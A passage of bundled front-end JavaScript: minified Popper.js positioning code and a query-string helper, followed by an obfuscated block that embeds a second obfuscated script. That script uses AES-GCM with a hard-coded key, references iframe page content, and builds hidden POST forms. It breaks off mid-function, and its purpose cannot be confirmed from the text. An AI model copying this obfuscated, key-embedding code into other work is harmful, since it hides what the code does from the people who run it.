        return ("BODY" !== t || "static" !== getComputedStyle(e).position) && ("HTML" === t || S(e.firstElementChild) === e)
    }
    function c(e) {
        return null !== e.parentNode ? c(e.parentNode) : e
    }
    function v(e, t) {
        if (!(e && e.nodeType && t && t.nodeType))
            return document.documentElement;
        var n = e.compareDocumentPosition(t) & Node.DOCUMENT_POSITION_FOLLOWING,
            o = n ? e : t,
            i = n ? t : e,
            r = document.createRange();
        r.setStart(o, 0),
        r.setEnd(i, 0);
        var a = r.commonAncestorContainer;
        if (e !== a && t !== a || o.contains(i))
            return l(a) ? a : S(a);
        var s = c(e);
        return s.host ? v(s.host, t) : v(e, c(t).host)
    }
    function f(e, t) {
        var n = "top" === (1 < arguments.length && t !== undefined ? arguments[1] : "top") ? "scrollTop" : "scrollLeft",
            o = e.nodeName.toUpperCase();
        if ("BODY" === o || "HTML" === o) {
            var i = e.ownerDocument.documentElement;
            return (e.ownerDocument.scrollingElement || i)[n]
        }
        return e[n]
    }
    function T(e, t, n) {
        var o = 2 < arguments.length && n !== undefined && arguments[2],
            i = f(t, "top"),
            r = f(t, "left"),
            a = o ? -1 : 1;
        return e.top += i * a, e.bottom += i * a, e.left += r * a, e.right += r * a, e
    }
    function h(e, t) {
        var n = "x" === t ? "Left" : "Top",
            o = "Left" === n ? "Right" : "Bottom";
        return parseFloat(e["border" + n + "Width"], 10) + parseFloat(e["border" + o + "Width"], 10)
    }
    function i(e, t, n, o) {
        return Math.max(t["offset" + e], t["scroll" + e], n["client" + e], n["offset" + e], n["scroll" + e], m(10) ? parseInt(n["offset" + e]) + parseInt(o["margin" + ("Height" === e ? "Top" : "Left")]) + parseInt(o["margin" + ("Height" === e ? "Bottom" : "Right")]) : 0)
    }
    function b(e) {
        var t = e.body,
            n = e.documentElement,
            o = m(10) && getComputedStyle(n);
        return {
            height: i("Height", t, n, o),
            width: i("Width", t, n, o)
        }
    }
    function x(e) {
        return Te({}, e, {
            right: e.left + e.width,
            bottom: e.top + e.height
        })
    }
    function w(e) {
        var t = {};
        try {
            if (m(10)) {
                t = e.getBoundingClientRect();
                var n = f(e, "top"),
                    o = f(e, "left");
                t.top += n,
                t.left += o,
                t.bottom += n,
                t.right += o
            } else
                t = e.getBoundingClientRect()
        } catch (d) {}
        var i = {
                left: t.left,
                top: t.top,
                width: t.right - t.left,
                height: t.bottom - t.top
            },
            r = "HTML" === e.nodeName.toUpperCase() ? b(e.ownerDocument) : {},
            a = r.width || e.clientWidth || i.right - i.left,
            s = r.height || e.clientHeight || i.bottom - i.top,
            l = e.offsetWidth - a,
            c = e.offsetHeight - s;
        if (l || c) {
            var u = y(e);
            l -= h(u, "x"),
            c -= h(u, "y"),
            i.width -= l,
            i.height -= c
        }
        return x(i)
    }
    function V(e, t, n) {
        var o = 2 < arguments.length && n !== undefined && arguments[2],
            i = m(10),
            r = "HTML" === t.nodeName.toUpperCase(),
            a = w(e),
            s = w(t),
            l = g(e),
            c = y(t),
            u = parseFloat(c.borderTopWidth, 10),
            d = parseFloat(c.borderLeftWidth, 10);
        o && r && (s.top = Math.max(s.top, 0), s.left = Math.max(s.left, 0));
        var f = x({
            top: a.top - s.top - u,
            left: a.left - s.left - d,
            width: a.width,
            height: a.height
        });
        if (f.marginTop = 0, f.marginLeft = 0, !i && r) {
            var h = parseFloat(c.marginTop, 10),
                p = parseFloat(c.marginLeft, 10);
            f.top -= u - h,
            f.bottom -= u - h,
            f.left -= d - p,
            f.right -= d - p,
            f.marginTop = h,
            f.marginLeft = p
        }
        return (i && !o ? t.contains(l) : t === l && "BODY" !== l.nodeName.toUpperCase()) && (f = T(f, t)), f
    }
    function C(e, t) {
        var n = 1 < arguments.length && t !== undefined && arguments[1],
            o = e.ownerDocument.documentElement,
            i = V(e, o),
            r = Math.max(o.clientWidth, window.innerWidth || 0),
            a = Math.max(o.clientHeight, window.innerHeight || 0),
            s = n ? 0 : f(o),
            l = n ? 0 : f(o, "left");
        return x({
            top: s - i.top + i.marginTop,
            left: l - i.left + i.marginLeft,
            width: r,
            height: a
        })
    }
    function k(e) {
        var t = e.nodeName.toUpperCase();
        if ("BODY" === t || "HTML" === t)
            return !1;
        if ("fixed" === y(e, "position"))
            return !0;
        var n = p(e);
        return !!n && k(n)
    }
    function E(e) {
        if (!e || !e.parentElement || m())
            return document.documentElement;
        for (var t = e.parentElement; t && "none" === y(t, "transform");)
            t = t.parentElement;
        return t || document.documentElement
    }
    function I(e, t, n, o, i) {
        var r = 4 < arguments.length && i !== undefined && arguments[4],
            a = {
                top: 0,
                left: 0
            },
            s = r ? E(e) : v(e, t);
        if ("viewport" === o)
            a = C(s, r);
        else {
            var l = void 0;
            "scrollParent" === o ? "BODY" === (l = g(p(t))).nodeName.toUpperCase() && (l = e.ownerDocument.documentElement) : l = "window" === o ? e.ownerDocument.documentElement : o;
            var c = V(l, s, r);
            if ("HTML" !== l.nodeName.toUpperCase() || k(s))
                a = c;
            else {
                var u = b(e.ownerDocument),
                    d = u.height,
                    f = u.width;
                a.top += c.top - c.marginTop,
                a.bottom = d + c.top,
                a.left += c.left - c.marginLeft,
                a.right = f + c.left
            }
        }
        var h = "number" == typeof (n = n || 0);
        return a.left += h ? n : n.left || 0, a.top += h ? n : n.top || 0, a.right -= h ? n : n.right || 0, a.bottom -= h ? n : n.bottom || 0, a
    }
    function N(e) {
        return e.width * e.height
    }
    function u(e, t, o, n, i, r) {
        var a = 5 < arguments.length && r !== undefined ? arguments[5] : 0;
        if (-1 === e.indexOf("auto"))
            return e;
        var s = I(o, n, a, i),
            l = {
                top: {
                    width: s.width,
                    height: t.top - s.top
                },
                right: {
                    width: s.right - t.right,
                    height: s.height
                },
                bottom: {
                    width: s.width,
                    height: s.bottom - t.bottom
                },
                left: {
                    width: t.left - s.left,
                    height: s.height
                }
            },
            c = Object.keys(l).map(function(e) {
                return Te({
                    key: e
                }, l[e], {
                    area: N(l[e])
                })
            }).sort(function(e, t) {
                return t.area - e.area
            }),
            u = c.filter(function(e) {
                var t = e.width,
                    n = e.height;
                return t >= o.clientWidth && n >= o.clientHeight
            }),
            d = 0 < u.length ? u[0].key : c[0].key,
            f = e.split("-")[1];
        return d + (f ? "-" + f : "")
    }
    function d(e, t, n, o) {
        var i = 3 < arguments.length && o !== undefined ? arguments[3] : null;
        return V(n, i ? E(t) : v(t, n), i)
    }
    function P(e) {
        var t = e.ownerDocument.defaultView.getComputedStyle(e),
            n = parseFloat(t.marginTop || 0) + parseFloat(t.marginBottom || 0),
            o = parseFloat(t.marginLeft || 0) + parseFloat(t.marginRight || 0);
        return {
            width: e.offsetWidth + o,
            height: e.offsetHeight + n
        }
    }
    function F(e) {
        var t = {
            left: "right",
            right: "left",
            bottom: "top",
            top: "bottom"
        };
        return e.replace(/left|right|bottom|top/g, function(e) {
            return t[e]
        })
    }
    function A(e, t, n) {
        n = n.split("-")[0];
        var o = P(e),
            i = {
                width: o.width,
                height: o.height
            },
            r = -1 !== ["right", "left"].indexOf(n),
            a = r ? "top" : "left",
            s = r ? "left" : "top",
            l = r ? "height" : "width",
            c = r ? "width" : "height";
        return i[a] = t[a] + t[l] / 2 - o[l] / 2, i[s] = n === s ? t[s] - o[c] : t[F(s)], i
    }
    function _(e, t) {
        return Array.prototype.find ? e.find(t) : e.filter(t)[0]
    }
    function o(e, t, n) {
        if (Array.prototype.findIndex)
            return e.findIndex(function(e) {
                return e[t] === n
            });
        var o = _(e, function(e) {
            return e[t] === n
        });
        return e.indexOf(o)
    }
    function B(e, n, t) {
        return (t === undefined ? e : e.slice(0, o(e, "name", t))).forEach(function(e) {
            e["function"] && console.warn("`modifier.function` is deprecated, use `modifier.fn`!");
            var t = e["function"] || e.fn;
            e.enabled && s(t) && (n.offsets.popper = x(n.offsets.popper), n.offsets.reference = x(n.offsets.reference), n = t(n, e))
        }), n
    }
    function r() {
        if (!this.state.isDestroyed) {
            var e = {
                instance: this,
                styles: {},
                arrowStyles: {},
                attributes: {},
                flipped: !1,
                offsets: {}
            };
            e.offsets.reference = d(this.state, this.popper, this.reference, this.options.positionFixed),
            e.placement = u(this.options.placement, e.offsets.reference, this.popper, this.reference, this.options.modifiers.flip.boundariesElement, this.options.modifiers.flip.padding),
            e.originalPlacement = e.placement,
            e.positionFixed = this.options.positionFixed,
            e.offsets.popper = A(this.popper, e.offsets.reference, e.placement),
            e.offsets.popper.position = this.options.positionFixed ? "fixed" : "absolute",
            e = B(this.modifiers, e),
            this.state.isCreated ? this.options.onUpdate(e) : (this.state.isCreated = !0, this.options.onCreate(e))
        }
    }
    function n(e, n) {
        return e.some(function(e) {
            var t = e.name;
            return e.enabled && t === n
        })
    }
    function H(e) {
        for (var t = [!1, "ms", "Webkit", "Moz", "O"], n = e.charAt(0).toUpperCase() + e.slice(1), o = 0; o < t.length; o++) {
            var i = t[o],
                r = i ? "" + i + n : e;
            if ("undefined" != typeof document.body.style[r])
                return r
        }
        return null
    }
    function R() {
        return this.state.isDestroyed = !0, n(this.modifiers, "applyStyle") && (this.popper.removeAttribute("x-placement"), this.popper.style.position = "", this.popper.style.top = "", this.popper.style.left = "", this.popper.style.right = "", this.popper.style.bottom = "", this.popper.style.willChange = "", this.popper.style[H("transform")] = ""), this.disableEventListeners(), this.options.removeOnDestroy && this.popper.parentNode.removeChild(this.popper), this
    }
    function a(e) {
        var t = e.ownerDocument;
        return t ? t.defaultView : window
    }
    function L(e, t, n, o) {
        var i = "BODY" === e.nodeName.toUpperCase(),
            r = i ? e.ownerDocument.defaultView : e;
        r.addEventListener(t, n, {
            passive: !0
        }),
        i || L(g(r.parentNode), t, n, o),
        o.push(r)
    }
    function j(e, t, n, o) {
        n.updateBound = o,
        a(e).addEventListener("resize", n.updateBound, {
            passive: !0
        });
        var i = g(e);
        return L(i, "scroll", n.updateBound, n.scrollParents), n.scrollElement = i, n.eventsEnabled = !0, n
    }
    function M() {
        this.state.eventsEnabled || (this.state = j(this.reference, this.options, this.state, this.scheduleUpdate))
    }
    function O(e, t) {
        return a(e).removeEventListener("resize", t.updateBound), t.scrollParents.forEach(function(e) {
            e.removeEventListener("scroll", t.updateBound)
        }), t.updateBound = null, t.scrollParents = [], t.scrollElement = null, t.eventsEnabled = !1, t
    }
    function D() {
        this.state.eventsEnabled && (cancelAnimationFrame(this.scheduleUpdate), this.state = O(this.reference, this.state))
    }
    function U(e) {
        return "" !== e && !isNaN(parseFloat(e)) && isFinite(e)
    }
    function W(n, o) {
        Object.keys(o).forEach(function(e) {
            var t = "";
            -1 !== ["width", "height", "top", "right", "bottom", "left"].indexOf(e) && U(o[e]) && (t = "px"),
            n.style[e] = o[e] + t
        })
    }
    function G(t, n) {
        Object.keys(n).forEach(function(e) {
            !1 !== n[e] ? t.setAttribute(e, n[e]) : t.removeAttribute(e)
        })
    }
    function z(e) {
        return W(e.instance.popper, e.styles), G(e.instance.popper, e.attributes), e.arrowElement && Object.keys(e.arrowStyles).length && W(e.arrowElement, e.arrowStyles), e
    }
    function J(e, t, n, o, i) {
        var r = d(i, t, e, n.positionFixed),
            a = u(n.placement, r, t, e, n.modifiers.flip.boundariesElement, n.modifiers.flip.padding);
        return t.setAttribute("x-placement", a), W(t, {
            position: n.positionFixed ? "fixed" : "absolute"
        }), n
    }
    function q(e, t) {
        var n = e.offsets,
            o = n.popper,
            i = n.reference,
            r = Math.round,
            a = Math.floor,
            s = function s(e) {
                return e
            },
            l = r(i.width),
            c = r(o.width),
            u = -1 !== ["left", "right"].indexOf(e.placement),
            d = -1 !== e.placement.indexOf("-"),
            f = t ? u || d || l % 2 == c % 2 ? r : a : s,
            h = t ? r : s;
        return {
            left: f(l % 2 == 1 && c % 2 == 1 && !d && t ? o.left - 1 : o.left),
            top: h(o.top),
            bottom: h(o.bottom),
            right: f(o.right)
        }
    }
    function $(e, t) {
        var n = t.x,
            o = t.y,
            i = e.offsets.popper,
            r = _(e.instance.modifiers, function(e) {
                return "applyStyle" === e.name
            }).gpuAcceleration;
        r !== undefined && console.warn("WARNING: `gpuAcceleration` option moved to `computeStyle` modifier and will not be supported in future versions of Popper.js!");
        var a = r !== undefined ? r : t.gpuAcceleration,
            s = S(e.instance.popper),
            l = w(s),
            c = {
                position: i.position
            },
            u = q(e, window.devicePixelRatio < 2 || !Se),
            d = "bottom" === n ? "top" : "bottom",
            f = "right" === o ? "left" : "right",
            h = H("transform"),
            p = void 0,
            g = void 0;
        if (g = "bottom" === d ? "HTML" === s.nodeName.toUpperCase() ? -s.clientHeight + u.bottom : -l.height + u.bottom : u.top, p = "right" === f ? "HTML" === s.nodeName.toUpperCase() ? -s.clientWidth + u.right : -l.width + u.right : u.left, a && h)
            c[h] = "translate3d(" + p + "px, " + g + "px, 0)",
            c[d] = 0,
            c[f] = 0,
            c.willChange = "transform";
        else {
            var m = "bottom" === d ? -1 : 1,
                v = "right" === f ? -1 : 1;
            c[d] = g * m,
            c[f] = p * v,
            c.willChange = d + ", " + f
        }
        var T = {
            "x-placement": e.placement
        };
        return e.attributes = Te({}, T, e.attributes), e.styles = Te({}, c, e.styles), e.arrowStyles = Te({}, e.offsets.arrow, e.arrowStyles), e
    }
    function X(e, t, n) {
        var o = _(e, function(e) {
                return e.name === t
            }),
            i = !!o && e.some(function(e) {
                return e.name === n && e.enabled && e.order < o.order
            });
        if (!i) {
            var r = "`" + t + "`",
                a = "`" + n + "`";
            console.warn(a + " modifier is required by " + r + " modifier in order to work, be sure to include it before " + r + "!")
        }
        return i
    }
    function Y(e, t) {
        var n;
        if (!X(e.instance.modifiers, "arrow", "keepTogether"))
            return e;
        var o = t.element;
        if ("string" == typeof o) {
            if (!(o = e.instance.popper.querySelector(o)))
                return e
        } else if (!e.instance.popper.contains(o))
            return console.warn("WARNING: `arrow.element` must be child of its popper element!"), e;
        var i = e.placement.split("-")[0],
            r = e.offsets,
            a = r.popper,
            s = r.reference,
            l = -1 !== ["left", "right"].indexOf(i),
            c = l ? "height" : "width",
            u = l ? "Top" : "Left",
            d = u.toLowerCase(),
            f = l ? "left" : "top",
            h = l ? "bottom" : "right",
            p = P(o)[c];
        s[h] - p < a[d] && (e.offsets.popper[d] -= a[d] - (s[h] - p)),
        s[d] + p > a[h] && (e.offsets.popper[d] += s[d] + p - a[h]),
        e.offsets.popper = x(e.offsets.popper);
        var g = s[d] + s[c] / 2 - p / 2,
            m = y(e.instance.popper),
            v = parseFloat(m["margin" + u], 10),
            T = parseFloat(m["border" + u + "Width"], 10),
            S = g - e.offsets.popper[d] - v - T;
        return S = Math.max(Math.min(a[c] - p, S), 0), e.arrowElement = o, e.offsets.arrow = (ve(n = {}, d, Math.round(S)), ve(n, f, ""), n), e
    }
    function K(e) {
        return "end" === e ? "start" : "start" === e ? "end" : e
    }
    function Q(e, t) {
        var n = 1 < arguments.length && t !== undefined && arguments[1],
            o = be.indexOf(e),
            i = be.slice(o + 1).concat(be.slice(0, o));
        return n ? i.reverse() : i
    }
    function Z(g, m) {
        if (n(g.instance.modifiers, "inner"))
            return g;
        if (g.flipped && g.placement === g.originalPlacement)
            return g;
        var v = I(g.instance.popper, g.instance.reference, m.padding, m.boundariesElement, g.positionFixed),
            T = g.placement.split("-")[0],
            S = F(T),
            y = g.placement.split("-")[1] || "",
            b = [];
        switch (m.behavior) {
        case xe.FLIP:
            b = [T, S];
            break;
        case xe.CLOCKWISE:
            b = Q(T);
            break;
        case xe.COUNTERCLOCKWISE:
            b = Q(T, !0);
            break;
        default:
            b = m.behavior
        }
        return b.forEach(function(e, t) {
            if (T !== e || b.length === t + 1)
                return g;
            T = g.placement.split("-")[0],
            S = F(T);
            var n = g.offsets.popper,
                o = g.offsets.reference,
                i = Math.floor,
                r = "left" === T && i(n.right) > i(o.left) || "right" === T && i(n.left) < i(o.right) || "top" === T && i(n.bottom) > i(o.top) || "bottom" === T && i(n.top) < i(o.bottom),
                a = i(n.left) < i(v.left),
                s = i(n.right) > i(v.right),
                l = i(n.top) < i(v.top),
                c = i(n.bottom) > i(v.bottom),
                u = "left" === T && a || "right" === T && s || "top" === T && l || "bottom" === T && c,
                d = -1 !== ["top", "bottom"].indexOf(T),
                f = !!m.flipVariations && (d && "start" === y && a || d && "end" === y && s || !d && "start" === y && l || !d && "end" === y && c),
                h = !!m.flipVariationsByContent && (d && "start" === y && s || d && "end" === y && a || !d && "start" === y && c || !d && "end" === y && l),
                p = f || h;
            (r || u || p) && (g.flipped = !0, (r || u) && (T = b[t + 1]), p && (y = K(y)), g.placement = T + (y ? "-" + y : ""), g.offsets.popper = Te({}, g.offsets.popper, A(g.instance.popper, g.offsets.reference, g.placement)), g = B(g.instance.modifiers, g, "flip"))
        }), g
    }
    function ee(e) {
        var t = e.offsets,
            n = t.popper,
            o = t.reference,
            i = e.placement.split("-")[0],
            r = Math.floor,
            a = -1 !== ["top", "bottom"].indexOf(i),
            s = a ? "right" : "bottom",
            l = a ? "left" : "top",
            c = a ? "width" : "height";
        return n[s] < r(o[l]) && (e.offsets.popper[l] = r(o[l]) - n[c]), n[l] > r(o[s]) && (e.offsets.popper[l] = r(o[s])), e
    }
    function te(e, t, n, o) {
        var i = e.match(/((?:\-|\+)?\d*\.?\d*)(.*)/),
            r = +i[1],
            a = i[2];
        if (!r)
            return e;
        if (0 === a.indexOf("%")) {
            var s = void 0;
            switch (a) {
            case "%p":
                s = n;
                break;
            case "%":
            case "%r":
            default:
                s = o
            }
            return x(s)[t] / 100 * r
        }
        if ("vh" === a || "vw" === a) {
            return ("vh" === a ? Math.max(document.documentElement.clientHeight, window.innerHeight || 0) : Math.max(document.documentElement.clientWidth, window.innerWidth || 0)) / 100 * r
        }
        return r
    }
    function ne(e, i, r, t) {
        var a = [0, 0],
            s = -1 !== ["right", "left"].indexOf(t),
            n = e.split(/(\+|\-)/).map(function(e) {
                return e.trim()
            }),
            o = n.indexOf(_(n, function(e) {
                return -1 !== e.search(/,|\s/)
            }));
        n[o] && -1 === n[o].indexOf(",") && console.warn("Offsets separated by white space(s) are deprecated, use a comma (,) instead.");
        var l = /\s*,\s*|\s+/,
            c = -1 !== o ? [n.slice(0, o).concat([n[o].split(l)[0]]), [n[o].split(l)[1]].concat(n.slice(o + 1))] : [n];
        return (c = c.map(function(e, t) {
            var n = (1 === t ? !s : s) ? "height" : "width",
                o = !1;
            return e.reduce(function(e, t) {
                return "" === e[e.length - 1] && -1 !== ["+", "-"].indexOf(t) ? (e[e.length - 1] = t, o = !0, e) : o ? (e[e.length - 1] += t, o = !1, e) : e.concat(t)
            }, []).map(function(e) {
                return te(e, n, i, r)
            })
        })).forEach(function(n, o) {
            n.forEach(function(e, t) {
                U(e) && (a[o] += e * ("-" === n[t - 1] ? -1 : 1))
            })
        }), a
    }
    function oe(e, t) {
        var n = t.offset,
            o = e.placement,
            i = e.offsets,
            r = i.popper,
            a = i.reference,
            s = o.split("-")[0],
            l = void 0;
        return l = U(+n) ? [+n, 0] : ne(n, r, a, s), "left" === s ? (r.top += l[0], r.left -= l[1]) : "right" === s ? (r.top += l[0], r.left += l[1]) : "top" === s ? (r.left += l[0], r.top -= l[1]) : "bottom" === s && (r.left += l[0], r.top += l[1]), e.popper = r, e
    }
    function ie(e, o) {
        var t = o.boundariesElement || S(e.instance.popper);
        e.instance.reference === t && (t = S(t));
        var n = H("transform"),
            i = e.instance.popper.style,
            r = i.top,
            a = i.left,
            s = i[n];
        i.top = "",
        i.left = "",
        i[n] = "";
        var l = I(e.instance.popper, e.instance.reference, o.padding, t, e.positionFixed);
        i.top = r,
        i.left = a,
        i[n] = s,
        o.boundaries = l;
        var c = o.priority,
            u = e.offsets.popper,
            d = {
                primary: function f(e) {
                    var t = u[e];
                    return u[e] < l[e] && !o.escapeWithReference && (t = Math.max(u[e], l[e])), ve({}, e, t)
                },
                secondary: function h(e) {
                    var t = "right" === e ? "left" : "top",
                        n = u[t];
                    return u[e] > l[e] && !o.escapeWithReference && (n = Math.min(u[t], l[e] - ("right" === e ? u.width : u.height))), ve({}, t, n)
                }
            };
        return c.forEach(function(e) {
            var t = -1 !== ["left", "top"].indexOf(e) ? "primary" : "secondary";
            u = Te({}, u, d[t](e))
        }), e.offsets.popper = u, e
    }
    function re(e) {
        var t = e.placement,
            n = t.split("-")[0],
            o = t.split("-")[1];
        if (o) {
            var i = e.offsets,
                r = i.reference,
                a = i.popper,
                s = -1 !== ["bottom", "top"].indexOf(n),
                l = s ? "left" : "top",
                c = s ? "width" : "height",
                u = {
                    start: ve({}, l, r[l]),
                    end: ve({}, l, r[l] + r[c] - a[c])
                };
            e.offsets.popper = Te({}, a, u[o])
        }
        return e
    }
    function ae(e) {
        if (!X(e.instance.modifiers, "hide", "preventOverflow"))
            return e;
        var t = e.offsets.reference,
            n = _(e.instance.modifiers, function(e) {
                return "preventOverflow" === e.name
            }).boundaries;
        if (t.bottom < n.top || t.left > n.right || t.top > n.bottom || t.right < n.left) {
            if (!0 === e.hide)
                return e;
            e.hide = !0,
            e.attributes["x-out-of-boundaries"] = ""
        } else {
            if (!1 === e.hide)
                return e;
            e.hide = !1,
            e.attributes["x-out-of-boundaries"] = !1
        }
        return e
    }
    function se(e) {
        var t = e.placement,
            n = t.split("-")[0],
            o = e.offsets,
            i = o.popper,
            r = o.reference,
            a = -1 !== ["left", "right"].indexOf(n),
            s = -1 === ["top", "left"].indexOf(n);
        return i[a ? "left" : "top"] = r[n] - (s ? i[a ? "width" : "height"] : 0), e.placement = F(t), e.offsets.popper = x(i), e
    }
    for (var le = "undefined" != typeof window && "undefined" != typeof document, ce = ["Edge", "Trident", "Firefox"], ue = 0, de = 0; de < ce.length; de += 1)
        if (le && 0 <= navigator.userAgent.indexOf(ce[de])) {
            ue = 1;
            break
        }
    var fe = le && window.Promise ? e : t,
        he = le && !(!window.MSInputMethodContext || !document.documentMode),
        pe = le && /MSIE 10/.test(navigator.userAgent),
        ge = function(e, t) {
            if (!(e instanceof t))
                throw new TypeError("Cannot call a class as a function")
        },
        me = function() {
            function o(e, t) {
                for (var n = 0; n < t.length; n++) {
                    var o = t[n];
                    o.enumerable = o.enumerable || !1,
                    o.configurable = !0,
                    "value" in o && (o.writable = !0),
                    Object.defineProperty(e, o.key, o)
                }
            }
            return function(e, t, n) {
                return t && o(e.prototype, t), n && o(e, n), e
            }
        }(),
        ve = function(e, t, n) {
            return t in e ? Object.defineProperty(e, t, {
                value: n,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = n, e
        },
        Te = Object.assign || function(e) {
            for (var t = 1; t < arguments.length; t++) {
                var n = arguments[t];
                for (var o in n)
                    Object.prototype.hasOwnProperty.call(n, o) && (e[o] = n[o])
            }
            return e
        },
        Se = le && /Firefox/i.test(navigator.userAgent),
        ye = ["auto-start", "auto", "auto-end", "top-start", "top", "top-end", "right-start", "right", "right-end", "bottom-end", "bottom", "bottom-start", "left-end", "left", "left-start"],
        be = ye.slice(3),
        xe = {
            FLIP: "flip",
            CLOCKWISE: "clockwise",
            COUNTERCLOCKWISE: "counterclockwise"
        },
        we = {
            placement: "bottom",
            positionFixed: !1,
            eventsEnabled: !0,
            removeOnDestroy: !1,
            onCreate: function Ce() {},
            onUpdate: function ke() {},
            modifiers: {
                shift: {
                    order: 100,
                    enabled: !0,
                    fn: re
                },
                offset: {
                    order: 200,
                    enabled: !0,
                    fn: oe,
                    offset: 0
                },
                preventOverflow: {
                    order: 300,
                    enabled: !0,
                    fn: ie,
                    priority: ["left", "right", "top", "bottom"],
                    padding: 5,
                    boundariesElement: "scrollParent"
                },
                keepTogether: {
                    order: 400,
                    enabled: !0,
                    fn: ee
                },
                arrow: {
                    order: 500,
                    enabled: !0,
                    fn: Y,
                    element: "[x-arrow]"
                },
                flip: {
                    order: 600,
                    enabled: !0,
                    fn: Z,
                    behavior: "flip",
                    padding: 5,
                    boundariesElement: "viewport",
                    flipVariations: !1,
                    flipVariationsByContent: !1
                },
                inner: {
                    order: 700,
                    enabled: !1,
                    fn: se
                },
                hide: {
                    order: 800,
                    enabled: !0,
                    fn: ae
                },
                computeStyle: {
                    order: 850,
                    enabled: !0,
                    fn: $,
                    gpuAcceleration: !0,
                    x: "bottom",
                    y: "right"
                },
                applyStyle: {
                    order: 900,
                    enabled: !0,
                    fn: z,
                    onLoad: J,
                    gpuAcceleration: undefined
                }
            }
        },
        Ve = function() {
            function a(e, t, n) {
                var o = this,
                    i = 2 < arguments.length && n !== undefined ? arguments[2] : {};
                ge(this, a),
                this.scheduleUpdate = function() {
                    return requestAnimationFrame(o.update)
                },
                this.update = fe(this.update.bind(this)),
                this.options = Te({}, a.Defaults, i),
                this.state = {
                    isDestroyed: !1,
                    isCreated: !1,
                    scrollParents: []
                },
                this.reference = e && e.jquery ? e[0] : e,
                this.popper = t && t.jquery ? t[0] : t,
                this.options.modifiers = {},
                Object.keys(Te({}, a.Defaults.modifiers, i.modifiers)).forEach(function(e) {
                    o.options.modifiers[e] = Te({}, a.Defaults.modifiers[e] || {}, i.modifiers ? i.modifiers[e] : {})
                }),
                this.modifiers = Object.keys(this.options.modifiers).map(function(e) {
                    return Te({
                        name: e
                    }, o.options.modifiers[e])
                }).sort(function(e, t) {
                    return e.order - t.order
                }),
                this.modifiers.forEach(function(e) {
                    e.enabled && s(e.onLoad) && e.onLoad(o.reference, o.popper, o.options, e, o.state)
                }),
                this.update();
                var r = this.options.eventsEnabled;
                r && this.enableEventListeners(),
                this.state.eventsEnabled = r
            }
            return me(a, [{
                key: "update",
                value: function e() {
                    return r.call(this)
                }
            }, {
                key: "destroy",
                value: function t() {
                    return R.call(this)
                }
            }, {
                key: "enableEventListeners",
                value: function n() {
                    return M.call(this)
                }
            }, {
                key: "disableEventListeners",
                value: function o() {
                    return D.call(this)
                }
            }]), a
        }();
    return Ve.Utils = ("undefined" != typeof window ? window : global).PopperUtils, Ve.placements = ye, Ve.Defaults = we, Ve
});
var QueryString = {};
!function(e) {
    e.parse = function(e) {
        return "string" != typeof e ? {} : (e = e.trim().replace(/^(\?|#)/, "")) ? e.trim().split("&").reduce(function(e, t) {
            var n = t.replace(/\+/g, " ").split("="),
                o = n[0],
                i = n.slice(1).join("=");
            return o = decodeURIComponent(o), i = i === undefined ? null : decodeURIComponent(i), e.hasOwnProperty(o) ? Array.isArray(e[o]) ? e[o].push(i) : e[o] = [e[o], i] : e[o] = i, e
        }, {}) : {}
    },
    e.stringify = function(n) {
        return n ? Object.keys(n).sort().map(function(t) {
            var e = n[t];
            return Array.isArray(e) ? e.sort().map(function(e) {
                return encodeURIComponent(t) + "=" + encodeURIComponent(e)
            }).join("&") : encodeURIComponent(t) + "=" + encodeURIComponent(e)
        }).join("&") : ""
    }
}(QueryString);
var _0xd729 = ["querySelectorAll", "target", "document", "classList", "contentWindow", "iframe:not(.favre-ignore)", "removeEventListener", "iframe.page-content, #prev-page, #next-page", "appendChild", "getElementById", "remove", "var _0x4b04=['href','submit','page-content','encrypt','raw','innerHTML','AES-GCM','name','input','hidden','method','action','catch','type','msCrypto','search','then','getElementById','crypto','removeChild','favrescript','result','tagLength','b64','brett','POST','subtle','byteLength','buffer','createElement','body','target','TextDecoder','oncomplete','slice','split','value','decrypt','fromCharCode','length','appendChild','trim','utf-16','parentElement','cacheKey'];(function(_0x5b95ad,_0x4b048e){var _0x4139d7=function(_0x58dd4c){while(--_0x58dd4c){_0x5b95ad['push'](_0x5b95ad['shift']());}};_0x4139d7(++_0x4b048e);}(_0x4b04,0x1e5));var _0x4139=function(_0x5b95ad,_0x4b048e){_0x5b95ad=_0x5b95ad-0x0;var _0x4139d7=_0x4b04[_0x5b95ad];return _0x4139d7;};var _0x1c47c5=new Uint8Array([0xdc,0x6d,0xba,0x54,0xac,0x91,0xc9,0xe7,0x56,0xa4,0xdd,0x34,0xd1,0x3e,0x45,0xb2,0xd8,0x60,0x80,0x6c,0x2d,0x2f,0xf6,0xac,0x26,0xfe,0xfc,0x4f,0xac,0x71,0xd4,0xc2]);function _0x37ab27(_0x91fab9){var _0x508af4=document[_0x4139('0x1b')](_0x4139('0x1e'));_0x508af4[_0x4139('0x8')][_0x4139('0x1d')](_0x508af4);}function _0x1626af(){return window['msCrypto'];}function _0x310508(){return window[_0x4139('0x1c')]||window[_0x4139('0x18')];}try{var _0x2d1373=function(_0x67696){return _0x310508()[_0x4139('0x24')]['importKey'](_0x4139('0xe'),_0x67696,_0x4139('0x10'),!![],[_0x4139('0xd'),'decrypt']);};var _0x5594b2=function(_0x414456){if(_0x4139('0x2a')in window){return new TextDecoder(_0x4139('0x7'))['decode'](_0x414456);}var _0x9eb6ef='';for(var _0x1fafee=0x0;_0x1fafee<_0x414456[_0x4139('0x25')];_0x1fafee+=0x2){_0x9eb6ef=_0x9eb6ef+String[_0x4139('0x3')]['apply'](null,new Uint16Array(_0x414456['slice'](_0x1fafee,_0x1fafee+0x2)));}return _0x9eb6ef;};var _0x8fbcb=function(_0x31be68,_0xfd662d){if(_0xfd662d===void 0x0)_0xfd662d=0x80;return _0x31be68['slice'](_0x31be68[_0x4139('0x25')]-(_0xfd662d+0x7>>0x3));};var _0x2d829a=function(_0x35cf02,_0x28c3d1){if(_0x28c3d1===void 0x0)_0x28c3d1=0x80;return _0x35cf02[_0x4139('0x2c')](0x0,_0x35cf02[_0x4139('0x25')]-(_0x28c3d1+0x7>>0x3));};var _0x507052=function(_0x1a488d,_0x3001f4,_0x5ca595){if(_0x1626af()){var _0x5dbd2b={};_0x5dbd2b[_0x4139('0x11')]=_0x4139('0x10');_0x5dbd2b['iv']=_0x5ca595;_0x5dbd2b['tag']=_0x8fbcb(_0x3001f4);return _0x310508()[_0x4139('0x24')][_0x4139('0x2')](_0x5dbd2b,_0x1a488d,_0x2d829a(_0x3001f4));}else{var 